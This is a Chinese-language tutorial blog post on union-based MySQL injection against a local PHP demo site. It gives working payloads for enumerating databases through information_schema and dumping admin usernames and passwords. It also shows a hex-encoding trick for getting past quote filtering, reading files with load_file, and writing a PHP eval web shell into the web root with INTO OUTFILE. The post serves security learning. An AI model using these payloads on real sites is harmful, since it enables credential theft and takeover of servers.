---
title: PHP应用&MYSQL架构&SQL注入&跨库查询&文件读写&权限操作
published: 2025-10-26
description: PHP项目Mysql注入、SQL文件读写。
tags: [PHP,WEB攻防,SQL注入]
category: 网络安全
draft: false
---

## 内容总结

> 1. root用户与用户A,用户B对数据库的管理区别
> 2. 获取相关数据：
>    - 数据库版本-看是否符合information_schema查询-version()
>    - 数据库用户-看**是否符合ROOT型注入攻击-user()**
>    - 当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os
>    - 数据库名字-为后期猜解指定数据库下的表，列做准备-database()
>
> 3. infomation_schema的介绍及如何查询。
>
> 4. 如何一步一步获取数据
>
> 5. 进行root的跨库查询,且单引号16进制绕过方法。
>
> 6. 文件写入1.root ，2.secure_file_priv=

MYSQL注入：（目的获取当前web权限）

1. 判断常见四个信息（系统，用户，数据库名，版本）
2. 根据四个信息去选择方案

- root用户：**先测试读写，后测试获取数据。**
- 非root用户：**直接测试获取数据。**

## 知识点

> 1. PHP-MYSQL-SQL注入-常规查询
> 2. PHP-MYSQL-SQL注入-跨库查询
> 3. PHP-MYSQL-SQL注入-文件读写

## PHP—MYSQL—Web组成架构

> 服务器安装 MYSQL 数据库，搭建多个站点，数据库集中存储 MYSQL 数据库中管理。
>
> 可以都使用 root 用户管理也可以创建多个用户进行每个网站对应的数据库管理。
>
> 1. 统一交 root 用户管理
>
>    每个网站的数据库都由root用户统一管理。
>
>    `www.zblog.com` = zblog = root =>MYSQL
>    `www.demo01.com` = demo01 = root =>MYSQL
>
> ```
> 统一交给root用户管理的结构
> mysql
> 	root(自带默认)
> 		网站A testA
> 		网站B testB
> ```
>
> 1. 一对一用户管理（推荐）
>
>    自己的网站单独创建数据库用户去管理自己的数据库。
>
>    `www.zblog.com` = zblog = zblog =>MYSQL
>    `www.demo01.com` = demo01 = demo01 =>MYSQL
>
> ```
> 一对一用户管理的结构
> mysql
> 	testA用户
> 		网站A testA	
> 	testB用户
> 		网站B testB
> ```

### SQL注入的概念

原理：接受的参数值**未进行过滤**直接带入SQL查询的操作。

攻击：**利用SQL语句执行你想要的东西**（SQL语句能干嘛，注入就能干嘛）。

**SQL语句能干嘛⇒SQL语句由谁决定⇒数据库类型决定（mysql注入、oracle注入，叫法原因）。**

```sql
http://localhost:63342/demo01/new.php?id=3
select * from news where id=3

http://localhost:63342/demoo1/new.php?id=3 union select 1,2,username,password,5,6 from admin
select * from news where id=3 union select 1,2,username,password,5,6 from admin
```

#### access注入与mysql的区别

结构层次：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4201.png)

#### SQL注入的流程介绍

获取相关数据：

1. 数据库版本-看是否符合information_schema查询-version()
2. 数据库用户-看**是否符合ROOT型注入攻击-user()**
3. 当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os
4. 数据库名字-为后期猜解指定数据库下的表，列做准备-database()

##### infomation_schema介绍

可以自行使用sql查询，进行查看结果。

information_schema：存储数据库下的数据库名及表名，列名信息的数据库

information_schema.schemata：记录数据库名信息的表

information_schema.tables：记录表名信息的表

information_schema.columns：记录列名信息表

schema_name：information_schema.schemata记录**数据库名信息的列名值**

table_schema：information_schema.tables记录**数据库名的列名值**

table_name：information_schema.tables记录**表名的列名值**

column_name：information_schema.columns**记录列名的列名值**

#### SQL注入的流程

**获取数据→一步一步得到信息**

##### Sql语句-Order By

`order by x`：这是一个排序语句，指示按照**第x列进行排序**。

1. 实战中，需要进行判断注入的列名有几个。
2. 有的话页面正常执行
3. 没有即会报错
4. 如：**该表存在6列，输入7后会报错。**

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4202.png)

##### Sql语句-Union Select

拿到该表存在6列的信息后，使用union select(联合查询)：

union select 1,2,3,4,5,6

这是一个UNION查询，用于将多个SELECT语句的结果合并在一起。在这个例子中，它选择了6个列，每个SELECT语句都返回常量值。

发现执行后回显的数据：分别出现在网页署名（2），正标题（3），副标题（4），次标题（5）

如果没有回显数据，则在查询id加入负号即可localhost:80/new.php?id=-1 union select 1,2,3,4,5,6（使其进行报错）

查找回显的作用：可以判断后期注入查询返回的数据，可以在页面中显示出来；

`union select 1,2,3,database(),user(),6`

这个UNION查询选择了6个列，并在**第4列返回数据库名称**，**第5列返回当前用户**，其他列返回常量值。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4203.png)

`union select 1,2,3,version(),@@version_compile_os,6`

这个UNION查询选择了6个列，**并在第4列返回数据库版本**，**第5列返回操作系统信息**，其他列返回常量值。

1. 返回**数据库版本**原因：MYSQL5.0以上版本：自带的数据库名information_schema（**只有5.0以上的版本才可以实行下一步查询**）。
2. 返回**操作系统信息**原因：如果**是Linux系统**对于后面的查询信息，**大小写特定敏感。**

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4204.png)

`union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='phpdemo'`

这个UNION查询选择了6个列，并从information_schema.tables表中返回指定数据库（demo01）中的所有表名的组合字符串。

1. information_schema.tables表记录表名信息的表
2. table_schema：information_schema.tables记录**数据库名的列名值**
3. table_name：information_schema.tables记录**表名的列名值**
4. group_concat()是全部查询出来

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4205.png)

`union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema='demo01' and table_name='admin'`

这个UNION查询选择了6个列，并从information_schema.columns表中返回指定表（admin）中的所有列名的组合字符串。

1. `information_schema.columns` **记录列名信息表**
2. `table_name`：information_schema.tables记录**表名的列名值**
3. `column_name：`information_schema.columns**记录列名的列名值**

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4206.png)

`union select 1,2,3,username,password,6 from admin limit 0,1`：这个UNION查询选择了6个列，并从**admin表中返回第一行记录的用户名和密码。**

1. limit 0,1代表是查询第一条。
2. limit 0,2代表是查询第二条。

limit的基础运用：https://blog.csdn.net/Aery_ha/article/details/143787129

若没显示可以用id=-1来使其报错显示。

也可以使用简单粗暴的：

`union select 1,2,3,username,passsword,6 from admin where id = 1`

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4207.png)

##  PHP—MYSQL—SQL跨库查询

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/6cd189f6fe894e6f93105500e2a9b47b.png)

我本地没下载CMS和模板，所以就只展示sql语句部分了，反正主要查询的还是数据库中的信息。

#### 先查身份是否为root

我本地使用的不是root身份，所以先去修改一下代码中的数据库配置。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4208.png)

#### 跨库查询顺序

`union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata`

通过 information_schema.schemata 获取所有数据库的名称，并将这些名称连接成一个字符串。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4209.png)



`union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='phpdemo'`

通过information_schema.tables 获取数据库'phpdemo'中所有表的名称，并将这些名称连接成一个字符串。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4210.png)

`union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='news'  and table_schema='phpdemo'`

通过 information_schema.columns 表获取'phpdemo'数据库中'news'表的所有列名，并将这些列名连接成一个字符串。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4211.png)

`union select 1,2,3,content,img,6 from phpdemo.news limit 0,1`

尝试从'phpdemo'数据库的'news'表中选择content和img列的数据，限制结果集为一个行。

**记住使用.来进行跨库查询**

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4212.png)

#### 注意事项

注意：

**由于是跨库操作，在此刻必须指明是哪个数据库的表名。**

**必须数据库权限是ROOT用户权限→才可以进行跨库。**

1. `from phpdemo数据库.news表名`，不然会进行**报错**
2. 表示 **`mysqli_query`** 返回的结果不是有效的 **`mysqli_result`** 对象，而是布尔值 **`false`**，可能是由于 SQL 查询执行失败。

#### 单引号过滤绕过方式

可以使用单引号绕过warf等。

SQL注入语句使用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）注意：在编码后执行SQL注入时候要在编码前加0x

当在编码后执行SQL注入时，如果要将编码后的Payload作为十六进制值直接传递给SQL语句，需要在编码前添加0x前缀。这是因为在许多DBMS中，0x前缀用于指示后续的字符串是十六进制值。

Hex编码（十六进制编码）是一种将数据转换为十六进制数字表示的编码方式。这种编码方式广泛用于表示二进制数据，例如在网络通信、编码传输、调试和数据存储中。

使用软件：CaptfEncoder：

举例：

`union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='zblog' 可以改为union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=0x7a626c6f67`

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/0b47f05d58ef4ee4bc3ac2f23307d0c8.png)

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/29faaec81bb3464c9d69fa28f8aea4dd.png" alt="img" style="zoom:80%;" />

## PHP—MYSQL—SQL文件读写

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/15b2fdd40fbe4e10afb368fbae3bdd2a.png)

#### 条件1

必须有root权限：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4213.png)



#### 条件2

在phpstudy中Mysql的my.ini中，secure_file_priv= ""这个存在，本地环境可以不限制，但是生产环境这样做很危险。

secure_file_priv是MySQL数据库中的一个系统变量，用于限制使用 LOAD DATA INFILE 和 SELECT ... INTO OUTFILE 语句时可以读取和写入的文件的路径。这个变量通常用于提高数据库的安全性，防止用户滥用这些语句导致的文件系统访问。

如果设置了这个变量，MySQL 将仅允许在指定的路径下进行文件的读取和写入操作。

如果没有设置，MySQL 将默认使用空值，表示都可以查询使用。

例如，如果 secure_file_priv 被设置为 f:\\，那么在执行 LOAD DATA INFILE 或 SELECT ... INTO OUTFILE 时，只允许读写位于 f:\\ 目录下的文件。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4214.png)

#### 演示

1. 将1.txt信息获取出来

`union select 1,2,3,4,load_file('F:\\Documents\\1.txt'),6`

使用此语句将1.txt读取出来。

load_file 函数加载本地文件1.txt的内容，并将其作为查询结果的一部分返回。

2. 如何获取权限

`http://localhost/new_demo/new.php?id=1 union select 1,2,3,4,'<?php eval($_POST[x])?>',6 into outfile '路径'`

注入语句为：`union select 1,2,3,4,'<?php eval($_POST[x]);?>',6 into outfile 'E:\\phpstudy\\phpstudy_pro\\WWW\\phpdemo\\1.php`，从中将一句话放入文件当中。

##### 如何获取读取路径呢？

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/8fd3a47cea2346f98d2816e1d7b6e145.png)

1. 通常中间件这些由文件：（读敏感文件）

F:\ProgrammingE\php\phpstudy_pro\Extensions\Apache2.4.39\conf\vhosts

可以看到端口。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4215.png)

2. 报错显示获取路径，容错显示。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4216.png)

3. phpinfo页面泄露

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4217.png)

如果不知道路径思路：**用常见的默认的中间件，数据库等安装路径读取有价值信息。**

**load_file()常用路径：**[load_file()常用路径_load file 目录-CSDN博客](https://blog.csdn.net/god_7z1/article/details/8725541)  